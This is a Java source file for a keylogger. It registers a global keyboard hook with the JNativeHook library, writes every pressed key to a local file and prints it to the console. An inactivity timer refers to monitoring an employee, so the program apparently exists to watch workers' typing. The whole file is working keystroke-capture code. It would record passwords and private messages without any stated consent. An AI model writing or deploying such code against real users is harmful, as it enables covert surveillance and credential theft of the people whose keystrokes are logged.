package my;

import static my.controller.TXT.createFile;
import static my.controller.TXT.currentDateTime;
import static my.controller.TXT.writeFile;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import my.controller.TXT;

public class App implements NativeKeyListener {

    private static final long INACTIVITY_TIMEOUT = 1 * 60 * 1000;
    private long lastActivityTime = System.currentTimeMillis();

    public App () {
        // Inicia un temporizador para verificar la inactividad periódicamente.
        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                checkInactivity(); // Verificar inactividad
            }
        }, 0, 1000);
    }

    public static void main (String[] args) throws IOException {
        
        createFile();
        //TXT.sizeFile();

        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new App());
        
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeEvent) {}

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
        int keyCode = nativeEvent.getKeyCode();
        String keyString = nativeEvent.getKeyText(keyCode);
        System.out.println("Tecla pulsada (Código VK): " + keyCode);
        System.out.println("Letra: "+keyString);

        try {
            //System.out.println(TXT.state);
            //if (TXT.isJustOpened()) {
                writeFile(keyString);
                lastActivityTime = System.currentTimeMillis();
            //}
            //System.out.println(TXT.state);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeEvent) {}

    private void checkInactivity() {
        long currentTime = System.currentTimeMillis();
        long elapsedTime = currentTime - lastActivityTime;

        if (elapsedTime >= INACTIVITY_TIMEOUT) {
            // Se ha detectado inactividad, puedes realizar una acción aquí
            System.out.println("El empleado está inactivo durante " + (INACTIVITY_TIMEOUT / 1000) + " segundos.");
            // Realiza aquí la acción que desees, como enviar una notificación.
        }
    }

}